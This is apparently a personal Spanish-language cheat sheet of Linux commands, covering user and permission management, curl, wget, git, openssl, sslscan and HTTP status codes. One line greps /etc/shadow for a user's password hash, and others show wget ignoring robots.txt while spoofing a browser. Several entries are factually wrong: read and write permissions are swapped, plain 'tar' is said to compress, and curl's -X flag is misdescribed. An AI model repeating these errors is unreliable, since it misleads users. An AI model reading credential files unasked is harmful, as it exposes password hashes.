:w                                  (guardar cambios) 💾  
:wq                               (salir y guardar) 💾❌  
:q                                  (salir de VIM) ❌  
:ql                                 (salir sin guardar) ❌  
:q!                                 (forzar salir sin guardar) ❌❌  
​  
Editar archivo remoto con VIM:  
vim scp://usuario@host//ruta/archivo

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

### 📋 PORTAPAPELES  
  
Instalar xclip:  
sudo apt install xclip  
  
Obtener texto copiado al portapapeles:  
xclip -o -sel -clip  
  
Guardar texto del portapapeles en una variable:  
ppapeles=$(xclip -o -selection clipboard)  
  
echo "$ppapeles"  
 

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

### 🟨 JS-BEAUTIFY  
  
El comando js-beautify sirve para reordenar un texto desordenado en código JavaScript.  
   
Instalación:  
sudo apt install jsbeautifier  
   
Reordenar texto de archivo:  
js-beautify code.js   
  
Reordenar texto de archivo y guardar en archivo nuevo:  
js-beautify code.js  > code2.js   
  
Reordenar texto de archivo y guardar en otro existente:  
js-beautify code.js  >> code2.js  

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

### 🧑 USUARIOS  
  
Ver usuario actual:  
whoami  
  
Ver usuarios conectados:  
who  
  
ROOT:  
sudo su                                                  (escalar privilegios a Root)  
sudo [comando]                                 (ejecutar comando como Root)  
sudo !!                                                    (ejecutar último comando como Root)  
sudo -k                                                   (eliminar token de privilegios)  
su [usuario]                                          (sustituir usuario)  
exit                                                         (desescalar privilegios)  
  
Crear y borrar usuarios:  
adduser [usuario]                                  (crear usuario nuevo)  
useradd [usuario]                                  (crear usuario nuevo)  
useradd -s /bin/sh [usuario]              (definiendo su shell)  
useradd [usuario] -s /bin/bash         (definiendo su shell)  
useradd [usuario] -s /bin/zsh            (definiendo su shell)  
useradd [usuario] -d /home/we        (definiendo su directorio)  
useradd [usuario] -m /home/we       (define directorio si no existe)  
userdel [usuario]                                    (borrar usuario)  
userdel -r [usuario]                                (borrar usuario + su directorio home)  
deluser --remove-home [usuario]     (borrar usuario + su directorio home. alternativa)  
  
Crear usuario definiendo su directorio y su shell en un one-liner:  
sudo useradd -m -d /home/invitado -s /bin/zsh invitado  
  
Contraseña de usuario:  
passwd [usuario]                                                             (definir / cambiar contraseña usuario)  
/usr/bin/passwd [usuario]                                            (definir / cambiar contraseña usuario)  
sudo /usr/bin/grep '^usuario' /etc/shadow             (ver contraseña encriptada de usuario en /etc/shadow. requiere root)  
   
Modificar parámetros de usuario:  
usermod -c "comentario" [usuario]          (añadir comentario)  
usermod -d /home/carpeta [usuario]      (cambiar directorio)  
usermod -e 2025-05-10 [usuario]            (fecha expiración)  
usermod -g (grupo) [usuario]                     (cambiar grupo)  
usermod -L [usuario]                                    (bloquear usuario)  
usermod -U [usuario]                                   (desbloquear usuario)  
  
Comprobar existencia de usuario:  
cat /etc/passwd | grep usuario             (buscar por nombre)  
tail /etc/passwd                                   (buscar sin saber el nombre)

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

### 👨‍👨‍👦 GRUPOS  
  
Crear y borrar grupos:  
groupadd [grupo]                                        (crear grupo)  
groupdel [grupo]                                         (eliminar grupo)  
  
Modificar grupos:  
usermod -a -G [grupo] [usuario]             (Añadir usuario a grupo)  
chgrp [grupo] /ruta/archivo                     (cambiar grupo de archivo/directorio)  
  
Contraseñas grupos:  
passwd [usuario]                                         (definir contraseña usuario)  
  
Ver grupos de pertenencia:  
groups                                 (muestra todos los grupos simplificado)  
id                                               (muestra todos los grupos con Nº id)  
id | awk '{print $1}'            (muestra Nº id de usuario)  
id | awk '{print $2}'            (muestra Nº id de grupo)  
 

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

### ✅ PERMISOS

![lines.png](https://static.wixstatic.com/media/afa158_20416322ce0b4d3daa7c9a8f211d3712~mv2.png/v1/fill/w_757,h_196,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/lines.png)

### Tipos de archivo  
-      (archivo ordinario)  
d      (directorio)  
c      (archivo de carácter especial)  
l       (enlace simbólico)  
s      (socket)  
p      (pipe)  
b      (archivo especial de bloques)  
 

### chmod flags  
u       (usuario creador)  
g       (miembros del grupo)  
o       (otros usuarios)  
a       (todos los usuarios)  
-        (quitar permiso)  
+       (añadir permiso)  
=       (cambiar permiso)  
 

### Tipos de permiso  
-        (sin permiso)  
r        (permiso de escritura)  
w      (permiso de lectura)  
x       (permiso de ejecución)  
s       (suid)

### Permisos en decimal  
rwx     r-x     -w-  
  
421   401   020  
  
   7        5        2   

### Modificar permisos con flags:  
chmod o+r [archivo]         (sumar permiso de lectura a otros)  
chmod g+rwx [archivo]    (sumar todos los permisos al grupo)  
chmod u-w [archivo]        (quitar permiso de escritura a usuario)  
  
Modificar permisos en formato decimal:  
chmod 777 [archivo]      (rwx rwx rwx)  
chmod 751 [archivo]      (rwx  r-x    --x)  
chmod 520 [archivo]      ( r-x  -w-    ---)  
   
Modificar usuario propietario de archivo:  
chown suario1 [archivo]  
  
Modificar grupo autorizado de archivo:  
chown :grupo1 [archivo]  
  
Modificar usuario propietario y grupo autorizado de archivo:  
chown usuario1:grupo1 [archivo]

### Copiar permisos de un archivo a otro (del 1 al 2):

### chmod --reference [archivo1] [archivo2]  
  
🌐 [Chmod Calculator](https://chmod-calculator.com/)  
 

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

### 🗜️ DE/COMPRESIÓN  
  
archivos zip  
zip [archivo]                                   (comprimir)  
unzip [archivo]                           (descomprimir)  
  
archivos .gz  
gzip [archivo]                              (comprimir)  
gzip -d [archivo]                         (descomprimir)  
  
archivos .bz2  
bzip2 [archivo]                            (comprimir)  
bzip2 -d [archivo]                       (descomprimir)  
  
archivos POSIX tar  
tar [archivo]                                (comprimir)  
tar -xf [archivo]                         (descomprimir)  
  
7z multiextensión (zip, gz, bz2, tar, xz, 7z)  
7z x [archivo]                              (descomprimir)  
7z l [archivo]                              (listar información de archivo)  
 

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

### 🗜️ REDUCIR PESO BINARIO DEL SISTEMA  
  
Ejemplo con binario descargado de GitHub:  
  
git clone [https://github.com/binario](https://github.com/binario)  
  
cd /ruta_del_binario/  
  
go build -ldflags "-s -w" .  
  
du -hc [nº binario]  
  
upx [nº binario]  
 

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

### 🔢 BASE 64  
  
Para texto:  
echo "hola" | base64                                         (pasar texto a base64)  
echo "sGsdf8d==" | base64 -d                        (pasar texto base64 a texto)  
echo "hola" | base64 > [archivo]                    (guardando en archivo)  
echo "sGsdf8d==" | base64 -d > [archivo]   (guardando en archivo)  
  
Para archivos:  
base64 [archivo]                      (pasar archivo de texto a archivo en base64)  
base64 -d [archivo]                 (pasar archivo en base64 a archivo de texto)  
 

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

### 6️⃣ SISTEMA HEXADECIMAL  
  
Hexadecimal a decimal en Phyton:  
python3                                      (abrir consola python)  
0x [Nº en hexadecimal]             (pasa nº a decimal)  
  
Archivos  
xxd [archivo]                                               (pasar archivo de texto a formato hexadecimal)  
xxd [archivo] > [archivo_nuevo]            (como el anterior pero definiendo nombre)  
xxd -r [archivo] > [archivo_nuevo]        (pasar archivo hexadecimal a texto)

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

###  5️⃣ MD5SUM  
  
Verificar sumas de comprobación MD5:  
md5sum [archivo]                 
sJtyn56FhJj74eFhl0t4     <-(si el archivo es modificado,  esto variará)  
 

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

###  0️⃣ SISTEMA BINARIO  
  
Ejemplo para convertir un número decimal a binario:  
echo "obase=2; 9" | bc  
1001  
  
Ejemplo para convertir un número binario a decimal:  
echo "ibase=2; 10111" | bc  
23

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

###  ☑️ OPENSSL  (CRIPTOGRAFÍA)  
  
OpenSSL es una biblioteca robusta que proporciona una serie de herramientas y funciones para implementar protocolos de seguridad como SSL (Secure Sockets Layer) y TLS (Transport Layer Security). Estas herramientas permiten cifrar y descifrar datos, generar certificados, firmar archivos, y mucho más.  
   
Biblioteca Criptográfica:  
Contiene algoritmos criptográficos básicos como AES, DES, RC4, RSA, DSA, y más.  
  
Protocolos SSL/TLS:  
Implementaciones de los protocolos SSL y TLS para asegurar las comunicaciones entre servidores y clientes.  
  
Herramienta de Línea de Comandos:  
Permite ejecutar una variedad de comandos para manejar tareas criptográficas.  
  
Generación de Claves:  
Crear claves públicas y privadas.  
  
Certificados:  
Generar solicitudes de firma de certificado (CSR), firmar certificados y manejarlos.  
  
Cifrado/Descifrado de Archivos:  
Cifrar y descifrar archivos utilizando diferentes algoritmos.  
  
Hashing:  
Generar hashes de archivos y cadenas de texto.  
  
_____________________________________________________________________________________________  
  
Generación de Clave Privada RSA:  
openssl genpkey -algorithm RSA -out private_key.pem  
   
Generación de Solicitud de Firma de Certificado (CSR) usando una Clave Privada:  
openssl req -new -key private_key.pen -out request.csr  
   
Firmar una CSR con una Clave Privada para producir un Certificado:  
openssl x509 -req -in request.csr -signkey private_key.pem -out certificate.crt  
   
Cifrar archivo utilizando AES-256:  
openssl enc -aes-256-cbc -salt -in archivo.txt -out archivo.enc  
   
Descifrar archivo utilizando AES-256:  
openssl enc -aes-256-cbc -d -in archivo.enc -out archivo.dec  
  
Generar un Hash SHA-256 de un archivo:  
openssl dgst -sha256 archivo.txt

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

###  🌐​ CURL  
  
El comando curl en Linux es una herramienta de línea de comandos que se utiliza para transferir datos hacia o desde un servidor con URL, utilizando varios protocolos soportados (HTTP, FTP, POP3, IMAP, SMTP, SCP, SFTP, TFTP, TELNET, LDAP, etc.)  
   
Instalación:  
sudo apt-get install curl  
sudo apt install curl  
  
Ver por consola código HTML de una web:  
curl https://[www.ejemplo.com](http://www.ejemplo.com/)  
  
Descargar código HTML de una web (variación más funcional):  
curl -s -X GET https://[www.ejemplo.com](http://www.ejemplo.com/)  
  
Obtener código HTML de página web (en modo silent):  
curl -s -X GET https://[www.ejemplo.com](http://www.ejemplo.com/)  
  
Descargar código HTML de una web y guardarlo en un archivo especificando el nombre:  
curl https://[www.ejemplo.com](http://www.ejemplo.com/) > pagina.html  
  
Descargar archivo de una web y guardarlo en un archivo especificando el nombre:  
curl https://[www.ejemplo.com/wordlist.txt](http://www.ejemplo.com/wordlist.txt) -o list.txt  
  
Para subir un archivo a una web:  
curl -F "nombre_campo=@home/archivo" https://[www.ejemplo.com](http://www.ejemplo.com/)  
  
Comprobar estado de URL. Si la URL existe, devolverá un código "200" exitoso:  
curl -s -o /dev/null -w "%{http_code}" https://[www.ejemplo.com](http://www.ejemplo.com/)  
   
⚠️ Cuando "git clone" no funciona con GitHub (modificar la parte naranja para que corresponda con el repositorio):  
curl [https://codeload.github.com/vulhub/vulhub/tar.gz/master](https://codeload.github.com/vulhub/vulhub/tar.gz/master) | tar -xz --strip=2 vulhub-master/kibana/CVE-2018-17246  
  
PARÁMETROS:  
-s        (Modo Silent. Oculta parte del output, como el progreso de la descarga o los mensajes de error)  
-X       (Usado para agregar un encabezado "Authorization" con un token)  
-O       (Descargar el contenido de una URL y guardarlo en el directorio de trabajo actual con el mismo nombre de archivo que el remoto)                 Ejemplo: curl -O [http://testdomain.com/testfile.tar.gz](http://testdomain.com/testfile.tar.gz)  
-o        (Similar a -O, pero permite especificar un nombre de archivo o ubicación diferente para guardar el contenido descargado)              Ejemplo: curl -o newtestfile.tar.gz [http://testdomain.com/testfile.tar.gz](http://testdomain.com/testfile.tar.gz)  
-C -     (Para reanudar una descarga interrumpida)              Ejemplo: curl -C - -O [http://testdomain.com/testfile.tar.gz](http://testdomain.com/testfile.tar.gz)  
-x        (Cuando hay un servidor proxy. Debes proporcionar la dirección del servidor proxy y el puerto)  
              Ejemplo: curl -x sampleproxy.com:8090 -O [http://testdomain.com/testfile.tar.gz](http://testdomain.com/testfile.tar.gz)  
-I         (Para obtener la información del encabezado HTTP de una página web. Estado, servidor, contenido...etc)              Ejemplo: curl -I [www.testdomain.com](http://www.testdomain.com/)  
--cookie-jar (Para guardar las cookies de una URL en un archivo)   
               Ejemplo: curl --cookie-jar Mycookies.txt [https://www.samplewebsite.com/index.html](https://www.samplewebsite.com/index.html)  
-u        (Para proporcionar un nombre de usuario y una contraseña para conexiones FTP)   
              Ejemplo: curl -u username:password -O ftp://sampleftpserver/testfile.tar.gz  
--limit-rate (Para limitar la velocidad de descarga)              Ejemplo: curl --limit-rate 100K [http://testdomain.com/samplefile.tar.gz](http://testdomain.com/samplefile.tar.gz)  
-v        (Para proporcionar información detallada sobre la solicitud y la respuesta realizada)  
               Ejemplo: curl -v [https://google.com](https://google.com/)  
-sS      (Para ocultar la información de progreso en el outpur de curl. TOTAL, RECEIVED, XFERD, AVERAGE...etc)  
               Ejemplo: curl -sS [https://google.com](https://google.com/)  
  
USAR CURL CON SERVICIOS EXTERNOS:  
-s        (Mo  
 

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

###  🌐​ WGET  
  
El comando wget es una herramienta de línea de comandos en sistemas Unix y Linux que se utiliza para descargar archivos de la web. Es muy útil para descargar archivos automáticamente desde la línea de comandos sin necesidad de utilizar un navegador web.  
   
Instalación:  
sudo apt-get install wget  
  
SINTAXIS:  
wget [flags] [URL]  
  
PARÁMETROS:  
-r                                     (Descarga todo el sitio web recursivamente)  -c                                    (Hace que continúe una descarga que se había interrumpido)  
–continue                    (Hace que continúe una descarga que se había interrumpido)  
-N                                   (Descarga el archivo únicamente si es más nuevo que otro archivo que tenga el mismo nombre en tu ordenador)  
-t [nº]                            (Define el número de veces que wget debe intentar descargar un archivo en tu sistema operativo de Linux)  
-w [secs]                       (Define cuántos segundos deben transcurrir entre dos descargas consecutivas)  
-m                                  (Hace que wget descargue de forma recursiva, es decir, descargará todo el sitio web)  
-p                                   (Descarga todos los archivos necesarios para visualizar correctamente una página web, incluyendo imágenes y  
                                        archivos CSS)  
-np                                (No sigue enlaces a directorios superiores al directorio actual)  
-k                                   (Convierte los enlaces en los archivos descargados para que funcionen localmente, es decir, para que se refieran a los  
                                       archivos descargados y no a los enlaces originales)  
--no-clobber                (Evita sobrescribir archivos existentes)  
-erobots=off              (Ignora el archivo robots.txt, lo que permite descargar contenido que normalmente estaría bloqueado)  
-U mozilla                   (Finge ser un navegador Mozilla para evitar ser bloqueado por algunos servidores)  
--limit-rate=50K       (Limita la velocidad de descarga a 50K para evitar sobrecargar la conexión)  
--wait=2                      (Espera 2 segundos entre las solicitudes para evitar ser bloqueado por el servidor)  
--html-extension      (Guarda los archivos HTML con la extensión .html)               --page-requisites     (Descarga todos los elementos necesarios para mostrar la página correctamente. Imágenes, CSS, JavaScript, etc.)   --convert-links            (Convierte los enlaces para que funcionen localmente, offline)   
--domains [url]            (Limita la descarga a un dominio específico)  
--no-parent                  (No asciende a directorios superiores al dominio especificado)  
  
Descargar archivo especificando nombre:  
wget -O lista.txt https://[www.example.com/wordlist.txt](http://www.example.com/wordlist.txt)  
  
Descargar todos los archivos de una web, de forma recursiva:  
wget -r https://[www.example.com](http://www.example.com/)  
  
Descargar página principal como "index.html":  
wget https://[www.example.com](http://www.example.com/)  
  
Descargar página completa, de forma recursiva:  
wget -r https://[www.example.com](http://www.example.com/)  
  
Descargar archivos individuales:  
wget http://example.com/path/to/file.txt  
   
Descargar múltiples archivos a partir de una lista de URLs:  
wget -i filelist.txt    
  
Descargar archivos protegido:  
wget --user=username --password=password http://example.com/path/to/protected/file.txt      (Descargar archivo protegido)  
  
Descargar una web entera y sus subdominios:  
wget -m -p -np -k -erobots=off -U mozilla --limit-rate=50K --wait=2 --html-extension [http://example.com](http://example.com/) 

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

###  🌐​ GIT  
  
Diferentes comandos para interactuar desde la terminal con servidores GitHub.   
   
Copiar contenido de repositorio GitHub (esto incluye todos los archivos, la historia de commits, las ramas y las etiquetas):  
git clone [url]  
   
Ejemplo de descarga de repositorio:  
git clone [https://github.com/usuario/nombre_del_repositorio.git](https://github.com/usuario/nombre_del_repositorio.git)  
  
Ejemplo descarga de repositorio indicando ruta:  
git clone [https://github.com/usuario/nombre_del_repositorio.git](https://github.com/usuario/nombre_del_repositorio.git%C2%A0) /home/usuario/github/  
  
Descarga de rama específica del repositorio:  
git clone -b [nombre_de_la_rama] [url]  
  
_____________________________________________________________________________________________  
  
Gestionar repositorio GitHub:  
git init                                                                               (Crear proyecto en GitHub)  
git add . git commit -m "first commit"                  (Guardar cambios al repositorio)  
git status                                                                         (Ver estado actual del repositorio)  
git branch [rama]                                                          (Crear nueva rama)  
git branch -a                                                                   (Listar todas las ramas remotas o locales)  
git branch -d [rama]                                                     (Borrar rama)  
gitmerge [rama]                                                            (Combinar cambios a la rama actual)  
git checkout [rama]                                                      (Comprobar una rama existente)  
git checkout -b [rama]                                                 (Comprobar y crear una nueva rama)  
git tag [etiqueta]                                                           (Crear etiqueta)  
git tag -d [etiqueta]                                                      (Borrar etiqueta)  
git push --tags                                                               (Guardar etiquetas)  
git pull [rama] [URL/nombre]                                   (Obtener la última versión del repositorio)  
git remote add origin [URL]                                       (Agregar repositorio remoto)  
git config --global user.name [usuario]                 (Definir nombre de usuario para todos las instantáneas o commits)  
git config --global user.email [email]                     (Definir email de usuario para todos las instantáneas o commits)  
git help -g                                                                        (Guía de ayuda)  
git revert HEAD^                                                            (Deshacer cambios de instantánea previa)  
git push [URL/nombre] [rama]                                 (Guardar instantáneas locales en repositorio remoto)  
git stash -u                                                                     (Guardar trabajo actual con archivos sin-seguimiento)  
git rm -f [archivo]                                                          (Borrado forzado de archivo)  
git rm -r -f [directorio]                                                 (Borrado forzado de un directorio entero)  
git push origin :[rama]                                                 (Borrar rama remota)  
 

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

### 🖼️ DESCARGAR TODAS LAS IMÁGENES  
  
Descargar todas las imágenes de una página web con wget:  
wget -r -l1 --no-parent -nH -nd -P/tmp -A" -gif, .jpg, .jpeg, .bmp" [url]  
 

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

### 📄 LOCAL DNS  (/ETC/HOSTS)  
  
El archivo /etc/hosts en Linux es un archivo de texto plano utilizado para asociar direcciones IP con nombres de dominio totalmente calificados (FQDN). Este archivo es particularmente útil cuando un servidor DNS no está disponible y un usuario necesita acceder a un dominio desde su navegador. En ausencia de un servidor DNS accesible, Linux recurre al archivo /etc/hosts para resolver el nombre de dominio.  
  
Abrir y editar el archivo /etc/hosts:  
sudo mousepad /etc/hosts  
  
127.0.0.1    localhost  
127.0.1.1    kaliSF01  
# The following lines are desirable for IPv6 capable hosts  
::1     localhost ip6-localhost ip6-loopback  
ff02::1 ip6-allnodes  
ff02::2 ip6-allrouters  
10.100.100.100 example1.com  
10.100.100.200 example2.com  
  
También es posible añadir una línea de texto al final del archivo /etc/hosts con la siguiente línea:  
echo "10.100.100.300 example3.com" | sudo tee -a /etc/hosts  
  
Agregar esta entrada en el archivo /etc/hosts permitirá que el navegador resuelva el nombre de host example3.com a la dirección IP correspondiente y, por lo tanto, haga que el navegador incluya el encabezado HTTP Host: example3.com en cada solicitud HTTP que el navegador envíe a esta dirección IP, lo cual hará que el servidor responda con la página web para example3.com.  
 

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

### 🚦  CÓDIGOS DE ESTADO  
  
1** CÓDIGOS INFORMATIVOS:  
100                 (Continúa)  
101                 (Cambia de protocolos)  
102                 (Procesando)  
103                 (¿?)  
122                 (Solicitud URI demasiado larga)  
  
2** CÓDIGOS DE ÉXITO:  
200                 (OK)  
201                 (Creado)  
202                 (Aceptado)  
203                 (Información no-autorizativa)  
204                 (Sin contenido)  
205                 (Resetear contenido)  
206                 (Contenido parcial)  
207                 (Multi-estado)  
208                 (Previamente reportado)

### 218                 (Está correcto)

### 226                 (IM en uso)  
  
3** CÓDIGOS DE REDIRECCIÓN:  
300                 (Múltiples opciones)  
301                 (Movido permanentemente)  
302                 (Encontrado)  
303                 (Ver otro)  
304                 (No modificado)  
305                 (Utiliza proxy)  
306                 (Cambia proxy)

### 307                 (Redirección temporal)

### 308                 (Redirección permanente)  
  
4** CÓDIGOS DE ERROR DE CLIENTE:  
400                 (Solicitud errónea)  
401                 (No autorizado)  
402                 (Pago requerido)  
403                 (Prohibido)  
404                 (No encontrado)  
405                 (Método no permitido)  
406                 (Inaceptable)  
407                 (Autenticación de proxy requerida)  
408                 (Tiempo de solicitud agotado)  
409                 (Conflicto)  
410                 (Perdido)  
411                 (Distancia requerida)  
412                 (Precondición fallida)

### 413                 (Payload demasiado larga)

### 414                 (Solicitud URI demasiado larga)

### 415                 (Tipo de medio no soportado)

### 416                 (Rango de solicitud insatisfecho)

### 417                 (Expectación fallida)

### 418                 (Soy una tetera)

### 419                 (Tiempo de autenticación agotado)

### 420                 (¿?)

### 421                 (Solicitud mal dirigida)

### 422                 (Entidad no procesable)

### 423                 (Bloqueado)

### 424                 (Dependencia fallida)

### 425                 (Demasiado pronto)

### 426                 (Requiere actualización)

### 428                 (Requiere precondición)

### 429                 (Demasiadas solicitudes)

### 431                 (Campo "header" de solicitud demasiado largo)

### 444                 (Conexión cerrada sin respuesta)

### 449                 (Reintentar con)

### 451                 (No disponible por razones legales)

### 460                 (¿?)

### 463                 (¿?)

### 464                 (¿?)

### 494                 (Solicitud de "header" demasiado larga)

### 495                 (Error de Certificado SSL)

### 496                 (Certificado SSL requerido)

### 497                 (Solicitud HTTP enviada a puerto HTTPS)

### 499                 (El cliente cerró la solicitud)

### ​  
  
5** CÓDIGOS DE ERROR DE SERVIDOR:  
500                 (Error interno del servidor)  
501                 (No implementado)  
502                 (Mal "gateway")  
503                 (Servicio no disponible)  
504                 ("Gateway" tardó demasiado)  
505                 (Versión HTTP n osoportada)  
506                 (Variante tambien negocia)  
507                 (Almacenamiento insuficiente)  
508                 (Loop o ciclo detectado)  
510                 (No extendido)  
511                 (Se requiere autenticación de red)

### 520                 (Servidor web devuelve un error desconocido)

### 521                 (Servidor web caído)

### 522                 (Tiempo de conexión excedido)

### 523                 (Origen inalcanzable)

### 524                 (Ocurrió un tiempo de espera excesivo)

### 525                 (El handshake SSL falló)

### 526                 (Certificado SSL inválido)

### 527                 (Railgun error)

### 561                 (No autorizado)

### 598                 (Lectura de red con error de tiempo excedido)

### 599                 (Conexión de red con error de tiempo excedido)

### ​

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

### ☑️ OPENSSL  
  
Para establecer una Conexión SSL/TLS con OpenSSL a un servidor HTTPS (puerto 443)se puede utilizar el comando openssl s_client y realizar pruebas de conexión. De esta forma se abrirá una conexión SSL/TLS al servidor mostrando detalles sobre el certificado y la conexión. OpenSSL es una herramienta versátil que permite no solo manejar criptografía y certificados, sino también establecer conexiones seguras a servidores para pruebas y diagnósticos. La opción s_client es particularmente útil para verificar configuraciones de servidores y la validez de certificados SSL/TLS.  
  
SINTAXIS:  
openssl s_client -connect [url]:443  
  
EJEMPLO:  
openssl s_client -connect [www.google.com](http://www.google.com/):443 -servername [www.google.com](http://www.google.com/) -showcerts  
  
PARÁMETROS:  
--connect [url_host]:[puerto]               (Especifica el host y puerto al que deseas conectarte)  
--servername [hostname]                     (Utilizado para establecer el nombre del servidor. SNI - Server Name Indication)  
--showcerts                                               (Muestra todos los certificados en la cadena del servidor)  
-CAfile [archivo]                                        (Especifica un archivo de certificados CA para validar el certificado del servidor)

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

### 🔒 SSLSCAN  
  
SSLscan es una herramienta de línea de comandos utilizada para probar los servidores SSL/TLS. Es especialmente útil para evaluar la seguridad de las configuraciones SSL/TLS de un servidor, mostrando detalles como los certificados, los protocolos soportados y las vulnerabilidades potenciales.  
  
SINTAXIS:  
sslscan [url]  
  
EJEMPLO:  
sslscan --no-failed [www.google.com](http://www.google.com/)  
  
PARÁMETROS:  
--no-failed                                           (Incluye en el informe los intentos de conexión fallidos)  
--show-certificate                             (Muestra los detalles del certificado SSL/TLS)  
--ss12                                                    (Forzar el uso de este protocolo durante el escaneo)  
--ss13                                                    (Forzar el uso de este protocolo durante el escaneo)  
--tls1                                                     (Forzar el uso de este protocolo durante el escaneo)  
--tls1_1                                                (Forzar el uso de este protocolo durante el escaneo)  
--tls1_2                                                (Forzar el uso de este protocolo durante el escaneo)  
--tls1_3                                                (Forzar el uso de este protocolo durante el escaneo)  
--verbose                                             (Aumentar verbosidad. Más detalles)  
 

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

###  🖨️​ IMPRESORAS  
  
✔️ Habilitar impresora:  
enable [nombre_impresora]  
  
❌ Desahibilitar impresora:  
disable [nombre_impresora]  
  
📃 Imprimir archivo:  
cat [archivo] > /dev/lp  
  
📋 Ver cola de impresión:  
lpq  
  
⛔ Cancelar última impresión:  
lprm - # previous  
  
⛔ Cancelar toda la cola de impresión:  
lprm -a all  
  
🖨️ Ver estado de la impresora:  
lpstat -t

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

### 🔌 DISPOSITIVOS USB  
​  
Rutas:  
/dev/bus/usb                         (Dispositivos representados como sistema de archivos)  
/sys/bus/usb/devices         (Información detallada y estructura de dispositivos USB)  
/proc/bus/usb                       (Ruta en desuso. Información de dispositivos USB)  
  
Listar dispositivos USB conectados:  
lsusb  
​  
PARÁMETROS BÁSICOS:  
-v                                            (Modo DETALLADO)  
-t                                            (Mostrar información en forma de árbol)  
-s [dispositivo]                     (Mostrar información solo para un dispositivo específico. Por ejemplo 002:003)  
-d [vendor]:[producto]        (Mostrar solo dispositivos que coincidan con los ID de fabricante y producto. Por ejemplo 0781:5567)  
-d [ruta]                                  (Mostrar información detallada sobre dispositivo USB especificado por su ruta. Por ejemplo en /dev/bus/usb)  
​

[

](https://sf01web.wixsite.com/mayusoeh/comandos-linux)

### 💿 IMÁGENES DE DISCO (.iso)  
  
Montar imagen de disco .iso:  
sudo mount /ruta/archivo.iso /mnt/cdrom -oloop  
  
Desmontar imagen de disco .iso:  
sudo umount /mnt/cdrom
